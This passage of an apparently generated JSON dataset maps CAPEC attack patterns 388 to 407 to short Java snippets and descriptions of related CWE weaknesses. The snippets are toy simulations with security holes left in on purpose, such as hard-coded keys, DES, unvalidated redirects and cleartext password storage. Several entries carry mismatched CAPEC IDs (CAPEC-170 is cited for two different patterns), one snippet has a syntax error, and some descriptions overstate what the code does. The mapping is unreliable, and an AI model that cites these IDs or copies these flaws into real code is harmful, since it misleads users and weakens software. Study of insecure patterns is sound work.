        "description": "This Java servlet code snippet demonstrates a scenario where an adversary can manipulate client-side data to propagate malicious content. The servlet processes POST requests and reads parameters 'redirectUrl' and 'message' from the request. It then performs a redirection based on the 'redirectUrl' parameter without verifying its authenticity (CWE-345, CWE-346) and relies on the client to enforce security (CWE-602). Additionally, it displays the 'message' parameter without encryption or validation (CWE-311, CWE-471), allowing an attacker to modify assumed-immutable data and potentially inject malicious content. This code embodies the main idea of CAPEC 'Navigation Remapping To Propagate Malicious Content' by showing how improper handling of client-supplied data can lead to security vulnerabilities."
    },
    {
        "capec_id": "388",
        "capec_name": "Application API Button Hijacking",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class ButtonHijackingExample {\n    private static Map<String, String> buttonLinks = new HashMap<>();\n\n    public static void main(String[] args) {\n        // Initial button setup\n        buttonLinks.put(\"submit\", \"https://trustedsite.com/submit\");\n        buttonLinks.put(\"cancel\", \"https://trustedsite.com/cancel\");\n\n        // Simulate an attacker modifying the button link\n        modifyButtonLink(\"submit\", \"https://attackersite.com/submit\");\n\n        // Display buttons to the user\n        displayButtons();\n    }\n\n    private static void modifyButtonLink(String button, String newLink) {\n        // CWE-471: Modification of Assumed-Immutable Data (MAID)\n        buttonLinks.put(button, newLink);\n    }\n\n    private static void displayButtons() {\n        for (Map.Entry<String, String> entry : buttonLinks.entrySet()) {\n            System.out.println(\"Button: \" + entry.getKey() + \" -> Link: \" + entry.getValue());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of the 'Application API Button Hijacking' attack. The code initializes a set of buttons with their respective links. An attacker can modify the link of a button (CWE-471: Modification of Assumed-Immutable Data) to point to a malicious site. The `modifyButtonLink` method simulates this attack by changing the link of the 'submit' button to an attacker's URL. The `displayButtons` method then prints out the buttons and their links, showing how the user would see the manipulated content. This example highlights the vulnerability where the application does not properly protect the integrity of button links, leading to potential exploitation."
    },
    {
        "capec_id": "389",
        "capec_name": "Content Spoofing Via Application API Manipulation",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.io.OutputStreamWriter;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class ContentSpoofingExample {\n    public static void main(String[] args) {\n        try {\n            URL url = new URL(\"http://example.com/api/data\");\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setRequestMethod(\"POST\");\n            conn.setDoOutput(true);\n\n            // CWE-602: Client-Side Enforcement of Server-Side Security\n            String payload = \"{\\\"username\\\":\\\"admin\\\", \\\"password\\\":\\\"password\\\"}\";\n            OutputStreamWriter writer = new OutputStreamWriter(conn.getOutputStream());\n            writer.write(payload);\n            writer.flush();\n            writer.close();\n\n            // Read response\n            BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));\n            String line;\n            StringBuilder response = new StringBuilder();\n            while ((line = reader.readLine()) != null) {\n                response.append(line);\n            }\n            reader.close();\n\n            // CWE-353: Missing Support for Integrity Check\n            // Manipulate the response content\n            String manipulatedResponse = response.toString().replace(\"originalContent\", \"spoofedContent\");\n            System.out.println(\"Manipulated Response: \" + manipulatedResponse);\n\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic example of content spoofing via application API manipulation. The code sends a POST request to a server with a payload containing user credentials. It then reads the server's response and manipulates the content of the response before printing it out. This example embodies the main idea of CAPEC-272 by showing how an attacker can manipulate the content of messages to produce deceptive or malicious content. The code also highlights related CWEs: CWE-602 (Client-Side Enforcement of Server-Side Security) by relying on client-side code for security, and CWE-353 (Missing Support for Integrity Check) by not verifying the integrity of the data during transmission, allowing for content manipulation."
    },
    {
        "capec_id": "390",
        "capec_name": "Bypassing Physical Security",
        "code_snippet": "import java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\nimport java.util.logging.Level;\nimport java.util.logging.Logger;\n\npublic class PhysicalSecurityBypass {\n    private static final Logger logger = Logger.getLogger(PhysicalSecurityBypass.class.getName());\n    private static final String LOCK_FILE = \"/path/to/lockfile\";\n    private static final String ALERT_FILE = \"/path/to/alertfile\";\n\n    public static void main(String[] args) {\n        try {\n            // Bypass physical lock by deleting lock file\n            Files.deleteIfExists(Paths.get(LOCK_FILE));\n            logger.log(Level.INFO, \"Lock file deleted, physical lock bypassed.\");\n\n            // Disable alert system by deleting alert file\n            Files.deleteIfExists(Paths.get(ALERT_FILE));\n            logger.log(Level.INFO, \"Alert file deleted, alert system disabled.\");\n        } catch (IOException e) {\n            logger.log(Level.SEVERE, \"An error occurred while bypassing physical security.\", e);\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified scenario of bypassing physical security mechanisms. The code attempts to delete a lock file and an alert file, representing the bypassing of physical locks and disabling of alert systems, respectively. This embodies the main idea of CAPEC-Physical Security Bypass by showing how an attacker might evade physical security measures and disable alert mechanisms. The related CWEs are represented by the lack of proper protection against physical access (CWE-1263), improper handling of alert signals (CWE-1320), and the general concept of bypassing physical security controls."
    },
    {
        "capec_id": "391",
        "capec_name": "Bypassing Physical Locks",
        "code_snippet": "public class PhysicalLockBypass {\n    private boolean lockEngaged = true;\n    private boolean debugMode = false;\n\n    public void engageLock() {\n        if (!debugMode) {\n            lockEngaged = true;\n            System.out.println(\"Lock engaged.\");\n        } else {\n            System.out.println(\"Cannot engage lock in debug mode.\");\n        }\n    }\n\n    public void bypassLock() {\n        if (debugMode) {\n            lockEngaged = false;\n            System.out.println(\"Lock bypassed in debug mode.\");\n        } else {\n            System.out.println(\"Lock cannot be bypassed.\");\n        }\n    }\n\n    public void setDebugMode(boolean mode) {\n        debugMode = mode;\n        System.out.println(\"Debug mode set to: \" + debugMode);\n    }\n\n    public boolean isLockEngaged() {\n        return lockEngaged;\n    }\n\n    public static void main(String[] args) {\n        PhysicalLockBypass lockSystem = new PhysicalLockBypass();\n        lockSystem.setDebugMode(true); // Enabling debug mode\n        lockSystem.engageLock(); // Attempt to engage lock\n        lockSystem.bypassLock(); // Bypass lock in debug mode\n        System.out.println(\"Is lock engaged? \" + lockSystem.isLockEngaged());\n    }\n}",
        "description": "This Java code snippet represents a simplified simulation of bypassing a physical lock mechanism, embodying the main idea of the CAPEC 'Bypassing Physical Locks'. The code includes a lock system that can be engaged or bypassed. The lock can be bypassed if the system is in debug mode, which is a common vulnerability (CWE-1234: Hardware Internal or Debug Modes Allow Override of Locks). The `engageLock` method attempts to engage the lock unless the system is in debug mode, while the `bypassLock` method allows bypassing the lock if debug mode is enabled. This demonstrates how physical security measures can be compromised through improper access control and debug mode vulnerabilities."
    },
    {
        "capec_id": "392",
        "capec_name": "Lock Bumping",
        "code_snippet": "public class LockBumpingExample {\n    private static final String HARD_CODED_KEY = \"1234567890abcdef\"; // CWE-321\n    private boolean lockBit = true; // CWE-1231\n    private boolean powerState = true; // CWE-1232\n    private int[] addressRegion = new int[100]; // CWE-1222\n\n    public void bumpLock() {\n        if (lockBit) {\n            System.out.println(\"Lock is set. Attempting to bump...\");\n            // Simulate lock bumping by toggling the lock bit\n            lockBit = false;\n            System.out.println(\"Lock bumped! Lock bit is now: \" + lockBit);\n        } else {\n            System.out.println(\"Lock is already open.\");\n        }\n    }\n\n    public void powerTransition() {\n        System.out.println(\"Power state transition...\");\n        powerState = !powerState;\n        if (!powerState) {\n            lockBit = true; // Reset lock bit on power down\n        }\n        System.out.println(\"Power state is now: \" + powerState + \", Lock bit is: \" + lockBit);\n    }\n\n    public static void main(String[] args) {\n        LockBumpingExample example = new LockBumpingExample();\n        example.bumpLock(); // Attempt to bump the lock\n        example.powerTransition(); // Simulate power state transition\n        example.bumpLock(); // Attempt to bump the lock again\n    }\n}",
        "description": "This Java code snippet simulates the concept of lock bumping in a software context, using related CWEs for additional context. The `LockBumpingExample` class contains a hard-coded cryptographic key (CWE-321), a lock bit (CWE-1231), a power state (CWE-1232), and an address region (CWE-1222). The `bumpLock` method simulates the lock bumping process by toggling the lock bit, representing the temporary alignment of pins in a physical lock. The `powerTransition` method simulates a power state transition, which resets the lock bit, demonstrating how some protected registers or lock bits become programmable after power state transitions. The `main` method demonstrates the lock bumping and power state transition processes."
    },
    {
        "capec_id": "393",
        "capec_name": "Lock Picking",
        "code_snippet": "import java.util.concurrent.locks.ReentrantLock;\n\npublic class LockPickingExample {\n    private static final ReentrantLock lock = new ReentrantLock();\n    private static boolean lockBit = false;\n\n    public static void main(String[] args) {\n        // Simulate improper prevention of lock bit modification (CWE-1231)\n        lockBit = true;\n        System.out.println(\"Lock bit set: \" + lockBit);\n\n        // Simulate unrestricted externally accessible lock (CWE-412)\n        if (lockBit) {\n            lock.lock();\n            try {\n                System.out.println(\"Lock acquired by external actor.\");\n            } finally {\n                lock.unlock();\n            }\n        }\n\n        // Simulate unlock of a resource that is not locked (CWE-832)\n        try {\n            lock.unlock();\n        } catch (IllegalMonitorStateException e) {\n            System.out.println(\"Attempted to unlock a resource that is not locked.\");\n        }\n\n        // Simulate deadlock (CWE-833)\n        Thread t1 = new Thread(() -> {\n            lock.lock();\n            try {\n                System.out.println(\"Thread 1 acquired lock.\");\n                Thread.sleep(1000);\n            } catch (InterruptedException e) {\n                Thread.currentThread().interrupt();\n            } finally {\n                lock.unlock();\n            }\n        });\n\n        Thread t2 = new Thread(() -> {\n            lock.lock();\n            try {\n                System.out.println(\"Thread 2 acquired lock.\");\n            } finally {\n                lock.unlock();n            }\n        });\n\n        t1.start();\n        t2.start();\n    }\n}",
        "description": "This Java code snippet demonstrates several vulnerabilities related to lock handling, inspired by the CAPEC 'Lock Picking' and associated CWEs. The code simulates the following scenarios:\n\n1. **Improper Prevention of Lock Bit Modification (CWE-1231)**: The lock bit is set to true, but there is no mechanism to prevent its modification, representing a security flaw.\n2. **Unrestricted Externally Accessible Lock (CWE-412)**: The lock is acquired based on the lock bit being true, simulating an external actor gaining control over the lock.\n3. **Unlock of a Resource that is not Locked (CWE-832)**: An attempt is made to unlock the lock without it being locked, leading to an exception.\n4. **Deadlock (CWE-833)**: Two threads attempt to acquire the same lock, potentially leading to a deadlock situation.\n\nThe code highlights the importance of proper lock management and the potential security risks if locks are not handled correctly."
    },
    {
        "capec_id": "394",
        "capec_name": "Using a Snap Gun Lock to Force a Lock",
        "code_snippet": "public class LockMechanism {\n    private boolean lockBit = false; // CWE-1231\n    private boolean powerState = true; // true for active, false for sleep\n    private int[] keyPins = new int[5];\n    private int[] driverPins = new int[5];\n\n    public LockMechanism() {\n        // Initialize pins\n        for (int i = 0; i < 5; i++) {\n            keyPins[i] = 1;\n            driverPins[i] = 1;\n        }\n    }\n\n    public void setLockBit() {\n        if (!lockBit) {\n            lockBit = true;\n        }\n    }\n\n    public void modifyLockBit() {\n        // CWE-1231: Improper Prevention of Lock Bit Modification\n        lockBit = false;\n    }\n\n    public void powerTransition() {\n        // CWE-1232: Improper Lock Behavior After Power State Transition\n        powerState = !powerState;\n        if (!powerState) {\n            lockBit = false;\n        }\n    }\n\n    public boolean snapGunAttack() {\n        // Simulate snap gun attack\n        for (int i = 0; i < 5; i++) {\n            keyPins[i] = 0;\n            driverPins[i] = 0;\n        }\n        return checkAlignment();\n    }\n\n    private boolean checkAlignment() {\n        for (int i = 0; i < 5; i++) {\n            if (keyPins[i] != driverPins[i]) {\n                return false;\n            }\n        }\n        return true;\n    }\n\n    public static void main(String[] args) {\n        LockMechanism lock = new LockMechanism();\n        lock.setLockBit();\n        System.out.println(\"Lock bit set: \" + lock.lockBit);\n        lock.modifyLockBit();\n        System.out.println(\"Lock bit after modification: \" + lock.lockBit);\n        lock.powerTransition();\n        System.out.println(\"Lock bit after power transition: \" + lock.lockBit);\n        boolean unlocked = lock.snapGunAttack();\n        System.out.println(\"Lock opened by snap gun: \" + unlocked);\n    }\n}",
        "description": "This Java code snippet simulates a lock mechanism vulnerable to a snap gun attack, embodying the main idea of the CAPEC. The lock mechanism uses key pins and driver pins to simulate a physical lock. The `snapGunAttack` method simulates the snap gun attack by setting all pins to zero, representing the forced alignment of the pins. The code also includes vulnerabilities related to lock bit management (CWE-1231 and CWE-1232). The `modifyLockBit` method improperly allows the lock bit to be modified after it has been set, and the `powerTransition` method resets the lock bit during power state transitions, making the lock mechanism vulnerable to tampering."
    },
    {
        "capec_id": "395",
        "capec_name": "Bypassing Electronic Locks and Access Controls",
        "code_snippet": "import java.util.Arrays;\n\npublic class AccessControl {\n    // CWE-321: Use of Hard-coded Cryptographic Key\n    private static final byte[] HARD_CODED_KEY = {0x01, 0x23, 0x45, 0x67, 0x89, 0xAB, 0xCD, 0xEF};\n\n    public static void main(String[] args) {\n        byte[] cardData = {0x10, 0x20, 0x30, 0x40, 0x50, 0x60, 0x70, 0x80};\n        if (authenticate(cardData)) {\n            System.out.println(\"Access Granted\");\n        } else {\n            System.out.println(\"Access Denied\");\n        }\n    }\n\n    // CWE-327: Use of a Broken or Risky Cryptographic Algorithm\n    private static boolean authenticate(byte[] cardData) {\n        // Simple XOR-based authentication (insecure)\n        byte[] encryptedData = xorEncrypt(cardData, HARD_CODED_KEY);\n        byte[] expectedData = {0x11, 0x21, 0x31, 0x41, 0x51, 0x61, 0x71, 0x81};\n        return Arrays.equals(encryptedData, expectedData);\n    }\n\n    private static byte[] xorEncrypt(byte[] data, byte[] key) {\n        byte[] result = new byte[data.length];\n        for (int i = 0; i < data.length; i++) {\n            result[i] = (byte) (data[i] ^ key[i % key.length]);\n        }\n        return result;\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified and vulnerable access control mechanism that embodies the main idea of CAPEC-115: Bypassing Electronic Locks and Access Controls. The code uses a hard-coded cryptographic key (CWE-321) and a broken cryptographic algorithm (CWE-327) for authentication. The `authenticate` method uses a simple XOR-based encryption, which is insecure and can be easily bypassed by an attacker who knows or can deduce the hard-coded key. This represents the vulnerabilities in electronic access control systems that can be exploited to gain unauthorized access."
    },
    {
        "capec_id": "396",
        "capec_name": "DEPRECATED: Bypassing Card or Badge-Based Systems",
        "code_snippet": "import javax.crypto.Cipher;\nimport javax.crypto.KeyGenerator;\nimport javax.crypto.SecretKey;\nimport java.util.Base64;\n\npublic class VulnerableCardSystem {\n    private static final String ALGORITHM = \"DES\"; // CWE-327: Use of a Broken or Risky Cryptographic Algorithm\n    private SecretKey secretKey;\n\n    public VulnerableCardSystem() throws Exception {\n        KeyGenerator keyGen = KeyGenerator.getInstance(ALGORITHM);\n        secretKey = keyGen.generateKey();\n    }\n\n    public String encryptData(String data) throws Exception {\n        Cipher cipher = Cipher.getInstance(ALGORITHM);\n        cipher.init(Cipher.ENCRYPT_MODE, secretKey);\n        byte[] encryptedData = cipher.doFinal(data.getBytes());\n        return Base64.getEncoder().encodeToString(encryptedData);\n    }\n\n    public String decryptData(String encryptedData) throws Exception {\n        Cipher cipher = Cipher.getInstance(ALGORITHM);\n        cipher.init(Cipher.DECRYPT_MODE, secretKey);\n        byte[] decodedData = Base64.getDecoder().decode(encryptedData);\n        byte[] decryptedData = cipher.doFinal(decodedData);\n        return new String(decryptedData);\n    }\n\n    public static void main(String[] args) throws Exception {\n        VulnerableCardSystem vcs = new VulnerableCardSystem();\n        String cardData = \"1234-5678-9012-3456\";\n        String encryptedData = vcs.encryptData(cardData);\n        System.out.println(\"Encrypted Data: \" + encryptedData);\n        String decryptedData = vcs.decryptData(encryptedData);\n        System.out.println(\"Decrypted Data: \" + decryptedData);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable card system that uses the DES (Data Encryption Standard) algorithm for encrypting and decrypting card data. DES is considered a broken or risky cryptographic algorithm (CWE-327) due to its susceptibility to brute-force attacks. The code initializes a DES key, encrypts card data, and then decrypts it back to its original form. This example embodies the main idea of the deprecated CAPEC related to bypassing card or badge-based systems by highlighting the use of weak cryptographic algorithms, which can be exploited to bypass authentication mechanisms."
    },
    {
        "capec_id": "397",
        "capec_name": "Cloning Magnetic Strip Cards",
        "code_snippet": "import java.util.Arrays;\n\npublic class MagStripeCard implements Cloneable {\n    private byte[] cardData;\n\n    public MagStripeCard(byte[] data) {\n        this.cardData = Arrays.copyOf(data, data.length);\n    }\n\n    public byte[] getCardData() {\n        return Arrays.copyOf(cardData, cardData.length);\n    }\n\n    @Override\n    protected Object clone() throws CloneNotSupportedException {\n        return super.clone();\n    }\n\n    public static void main(String[] args) {\n        byte[] originalData = {0x12, 0x34, 0x56, 0x78};\n        MagStripeCard originalCard = new MagStripeCard(originalData);\n\n        try {\n            MagStripeCard clonedCard = (MagStripeCard) originalCard.clone();\n            System.out.println(\"Original Card Data: \" + Arrays.toString(originalCard.getCardData()));\n            System.out.println(\"Cloned Card Data: \" + Arrays.toString(clonedCard.getCardData()));\n        } catch (CloneNotSupportedException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the vulnerability of cloning a magnetic stripe card, which is the main idea of the CAPEC 'Cloning Magnetic Strip Cards'. The `MagStripeCard` class contains sensitive card data and implements the `Cloneable` interface, making it possible to create a duplicate of the card. The `main` method shows how an attacker could clone the card data by simply invoking the `clone` method. This example also touches on CWE-498 ('Cloneable Class Containing Sensitive Information'), as the class with sensitive data is cloneable, allowing unauthorized duplication of the card data."
    },
    {
        "capec_id": "398",
        "capec_name": "Magnetic Strip Card Brute Force Attacks",
        "code_snippet": "import java.util.Arrays;\nimport java.util.Random;\n\npublic class MagneticStripCardBruteForce {\n    private static final String HARD_CODED_KEY = \"1234567890ABCDEF\"; // CWE-321\n    private static final int MAX_ATTEMPTS = 1000; // CWE-307\n    private static final String[] VALID_CARDS = {\"CARD1DATA\", \"CARD2DATA\"};\n\n    public static void main(String[] args) {\n        Random random = new Random();\n        int attempts = 0;\n        boolean accessGranted = false;\n\n        while (attempts < MAX_ATTEMPTS && !accessGranted) {\n            String generatedCard = generateCardData(random);\n            if (isValidCard(generatedCard)) {\n                accessGranted = true;\n                System.out.println(\"Access Granted with card: \" + generatedCard);\n            }\n            attempts++;\n        }\n\n        if (!accessGranted) {\n            System.out.println(\"Access Denied. Maximum attempts reached.\");\n        }\n    }\n\n    private static String generateCardData(Random random) {\n        // Simulate card data generation using a hard-coded key (CWE-321)\n        byte[] cardData = new byte[16];\n        random.nextBytes(cardData);\n        return Arrays.toString(cardData) + HARD_CODED_KEY;\n    }\n\n    private static boolean isValidCard(String cardData) {\n        // Simulate validation using a broken cryptographic algorithm (CWE-327)\n        for (String validCard : VALID_CARDS) {\n            if (cardData.contains(validCard)) {\n                return true;\n            }\n        }\n        return false;\n    }\n}",
        "description": "This Java code snippet simulates a brute force attack on magnetic strip cards by generating card data and attempting to validate it against a set of known valid cards. The code demonstrates several vulnerabilities: \n1. CWE-321: Use of a hard-coded cryptographic key in the `generateCardData` method.\n2. CWE-307: Lack of sufficient measures to prevent excessive authentication attempts, as seen in the while loop with a high `MAX_ATTEMPTS` value.\n3. CWE-327: Use of a broken or risky cryptographic algorithm in the `isValidCard` method, which performs a simple string containment check instead of a secure validation.\nThe main idea of the CAPEC is represented by the brute force generation of card data to gain unauthorized access, leveraging weak authentication and cryptographic practices."
    },
    {
        "capec_id": "399",
        "capec_name": "Cloning RFID Cards or Chips",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class RFIDCloningExample {\n    private static Map<String, String> rfidDatabase = new HashMap<>();\n\n    public static void main(String[] args) {\n        // Simulate adding RFID tags to the database\n        rfidDatabase.put(\"1234567890\", \"Employee1\");\n        rfidDatabase.put(\"0987654321\", \"Employee2\");\n\n        // Simulate an attacker cloning an RFID tag\n        String clonedRFID = cloneRFID(\"1234567890\");\n\n        // Simulate access attempt with cloned RFID\n        if (authenticateRFID(clonedRFID)) {\n            System.out.println(\"Access Granted\");\n        } else {\n            System.out.println(\"Access Denied\");\n        }\n    }\n\n    private static String cloneRFID(String originalRFID) {\n        // Insecure cloning mechanism\n        return originalRFID; // Directly return the original RFID, simulating a clone\n    }\n\n    private static boolean authenticateRFID(String rfid) {\n        // Insecure authentication mechanism\n        return rfidDatabase.containsKey(rfid);\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified scenario of RFID card cloning and authentication. The `rfidDatabase` simulates a database of valid RFID tags. The `cloneRFID` method represents an insecure cloning mechanism that simply returns the original RFID, simulating a cloned tag. The `authenticateRFID` method checks if the provided RFID exists in the database, representing an insecure authentication mechanism. This code embodies the main idea of CAPEC-170 (Cloning RFID Cards or Chips) and highlights related weaknesses such as CWE-1294 (Insecure Security Identifier Mechanism) and CWE-1290 (Incorrect Decoding of Security Identifiers)."
    },
    {
        "capec_id": "400",
        "capec_name": "RFID Chip Deactivation or Destruction",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class RFIDChip {\n    private boolean isActive = true;\n    private Map<String, String> internalRegisters = new HashMap<>();\n\n    public RFIDChip() {\n        // Initialize internal registers with some dummy data\n        internalRegisters.put(\"register1\", \"value1\");\n        internalRegisters.put(\"register2\", \"value2\");\n    }\n\n    // Simulate access to internal registers without proper access control\n    public void accessInternalRegister(String register, String value) {\n        if (internalRegisters.containsKey(register)) {\n            internalRegisters.put(register, value);\n            System.out.println(\"Register \" + register + \" updated to \" + value);\n        } else {\n            System.out.println(\"Register not found\");\n        }\n    }\n\n    // Simulate deactivation of the RFID chip\n    public void deactivateChip() {\n        isActive = false;\n        System.out.println(\"RFID chip deactivated\");\n    }\n\n    // Check if the chip is active\n    public boolean isActive() {\n        return isActive;\n    }\n\n    public static void main(String[] args) {\n        RFIDChip chip = new RFIDChip();\n\n        // Unauthorized access to internal registers\n        chip.accessInternalRegister(\"register1\", \"new_value1\");\n\n        // Deactivate the RFID chip\n        chip.deactivateChip();\n\n        // Check if the chip is active\n        System.out.println(\"Is chip active? \" + chip.isActive());\n    }\n}",
        "description": "This Java code snippet simulates an RFID chip with internal registers and a deactivation mechanism. The `accessInternalRegister` method allows modification of internal registers without proper access control, representing CWE-1191 (On-Chip Debug and Test Interface With Improper Access Control). The `deactivateChip` method simulates the deactivation of the RFID chip, embodying the main idea of CAPEC-170 (RFID Chip Deactivation or Destruction). The code demonstrates how an attacker could exploit improper access control to modify internal registers and deactivate the RFID chip, rendering it unresponsive."
    },
    {
        "capec_id": "401",
        "capec_name": "Physically Hacking Hardware",
        "code_snippet": "public class HardwareAccessControl {\n    private boolean isDebugModeEnabled = false;\n    private boolean isVoltageGlitchDetected = false;\n    private boolean isPhysicalAccessGranted = false;\n\n    public void enableDebugMode() {\n        if (isPhysicalAccessGranted) {\n            isDebugModeEnabled = true;\n            System.out.println(\"Debug mode enabled.\");\n        } else {\n            System.out.println(\"Access denied: Physical access required.\");\n        }\n    }\n\n    public void detectVoltageGlitch() {\n        // Simulate voltage glitch detection\n        isVoltageGlitchDetected = true;\n        if (isVoltageGlitchDetected) {\n            System.out.println(\"Voltage glitch detected! System integrity compromised.\");\n        }\n    }\n\n    public void grantPhysicalAccess() {\n        isPhysicalAccessGranted = true;\n        System.out.println(\"Physical access granted.\");\n    }\n\n    public static void main(String[] args) {\n        HardwareAccessControl hac = new HardwareAccessControl();\n        hac.grantPhysicalAccess();\n        hac.enableDebugMode();\n        hac.detectVoltageGlitch();\n    }\n}",
        "description": "This Java code snippet represents a simplified model of a hardware access control system that embodies the main idea of the CAPEC 'Physically Hacking Hardware'. The code includes mechanisms for enabling debug mode, detecting voltage glitches, and granting physical access. The 'enableDebugMode' method checks if physical access is granted before enabling debug mode, highlighting CWE-1313 (Hardware Allows Activation of Test or Debug Logic at Runtime). The 'detectVoltageGlitch' method simulates the detection of a voltage glitch, representing CWE-1247 (Improper Protection Against Voltage and Clock Glitches). The 'grantPhysicalAccess' method simulates the granting of physical access, which is a critical aspect of CWE-1263 (Improper Physical Access Control). This code demonstrates how improper physical access control and insufficient protection mechanisms can lead to vulnerabilities in hardware systems."
    },
    {
        "capec_id": "402",
        "capec_name": "Bypassing ATA Password Security",
        "code_snippet": "import java.util.Scanner;\n\npublic class ATASecurityBypass {\n    private static final String HARD_CODED_PASSWORD = \"defaultPassword\";\n    private static boolean isAuthenticated = false;\n\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.print(\"Enter ATA password: \");\n        String inputPassword = scanner.nextLine();\n\n        if (authenticate(inputPassword)) {\n            isAuthenticated = true;\n            System.out.println(\"Access granted.\");\n        } else {\n            System.out.println(\"Access denied.\");\n        }\n\n        // Bypass authentication by directly updating the password\n        if (!isAuthenticated) {\n            System.out.print(\"Enter new ATA password: \");\n            String newPassword = scanner.nextLine();\n            updatePassword(newPassword);\n            System.out.println(\"Password updated without authentication.\");\n        }\n    }\n\n    private static boolean authenticate(String password) {\n        return HARD_CODED_PASSWORD.equals(password);\n    }\n\n    private static void updatePassword(String newPassword) {\n        // Simulate updating the password without proper authorization\n        System.out.println(\"Updating password to: \" + newPassword);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability related to bypassing ATA password security. The code includes a hard-coded password (CWE-259) and an improper authorization check (CWE-285). The main function prompts the user to enter an ATA password and checks it against the hard-coded password. If authentication fails, the code allows the user to update the password without proper authorization, simulating the bypass of ATA security. This represents the main idea of the CAPEC, where an adversary can exploit weaknesses in ATA security to gain unauthorized access to a drive's contents."
    },
    {
        "capec_id": "404",
        "capec_name": "DEPRECATED: Social Information Gathering Attacks",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\nimport java.util.logging.Logger;\n\npublic class VulnerableCode {\n    private static final Logger logger = Logger.getLogger(VulnerableCode.class.getName());\n\n    public static void main(String[] args) {\n        String sensitiveData = \"UserPassword123\";\n        storeSensitiveData(sensitiveData);\n    }\n\n    public static void storeSensitiveData(String data) {\n        try {\n            File file = new File(\"sensitiveData.txt\");\n            FileWriter writer = new FileWriter(file);\n            writer.write(data);\n            writer.close();\n            logger.info(\"Sensitive data stored successfully.\");\n        } catch (IOException e) {\n            logger.severe(\"Failed to store sensitive data.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable approach to storing sensitive data, embodying the deprecated CAPEC related to social information gathering attacks and the associated CWEs. The code writes sensitive data (a password) directly to a file without any encryption or protection, which is a common issue highlighted in CWE-217 (Failure to Protect Stored Data from Modification) and CWE-218 (Failure to provide confidentiality for stored data). Additionally, the use of logging to indicate the storage of sensitive data can lead to information exposure through server log files, as described in CWE-533. This code snippet represents the main idea of the deprecated CAPEC by showing how sensitive information can be improperly handled and exposed, making it vulnerable to unauthorized access and modification."
    },
    {
        "capec_id": "405",
        "capec_name": "DEPRECATED: Social Information Gathering via Research",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\nimport java.util.logging.Logger;\n\npublic class VulnerableCode {\n    private static final Logger logger = Logger.getLogger(VulnerableCode.class.getName());\n\n    public static void main(String[] args) {\n        String sensitiveData = \"UserPassword123\";\n        logSensitiveData(sensitiveData);\n        storeSensitiveData(sensitiveData);\n    }\n\n    private static void logSensitiveData(String data) {\n        // CWE-532: Information Exposure Through Log Files\n        logger.info(\"Sensitive Data: \" + data);\n    }\n\n    private static void storeSensitiveData(String data) {\n        // CWE-767: Improper Protection of Stored Data\n        File file = new File(\"sensitiveData.txt\");\n        try (FileWriter writer = new FileWriter(file)) {\n            writer.write(data);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates vulnerabilities related to deprecated CAPEC and CWE entries. The `logSensitiveData` method logs sensitive information (CWE-532), exposing it through log files. The `storeSensitiveData` method stores sensitive data in a file without proper protection (CWE-767). These practices can lead to information exposure and unauthorized data access, embodying the main idea of the deprecated CAPEC related to information gathering and exposure."
    },
    {
        "capec_id": "406",
        "capec_name": "Dumpster Diving",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\n\npublic class SensitiveDataHandler {\n    public static void main(String[] args) {\n        // CWE-316: Cleartext Storage of Sensitive Information in Memory\n        String sensitiveData = \"User: admin, Password: admin123\";\n        \n        // CWE-528: Exposure of Core Dump File to an Unauthorized Control Sphere\n        try {\n            File coreDump = new File(\"/tmp/core_dump.txt\");\n            FileWriter writer = new FileWriter(coreDump);\n            writer.write(sensitiveData);\n            writer.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        \n        // CWE-1266: Improper Scrubbing of Sensitive Data from Decommissioned Device\n        // Simulating decommissioning without proper scrubbing\n        File decommissionedDevice = new File(\"/tmp/decommissioned_device.txt\");\n        try {\n            FileWriter writer = new FileWriter(decommissionedDevice);\n            writer.write(sensitiveData);\n            writer.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates several vulnerabilities related to the CAPEC 'Dumpster Diving'. The code stores sensitive information (username and password) in cleartext in memory (CWE-316). It then writes this sensitive data to a core dump file in a temporary directory, which could be accessible to unauthorized actors (CWE-528). Additionally, it simulates the decommissioning of a device by writing the same sensitive data to another file without properly scrubbing the data (CWE-1266). This code exemplifies how sensitive information can be improperly handled and exposed, making it susceptible to dumpster diving attacks."
    },
    {
        "capec_id": "407",
        "capec_name": "Pretexting",
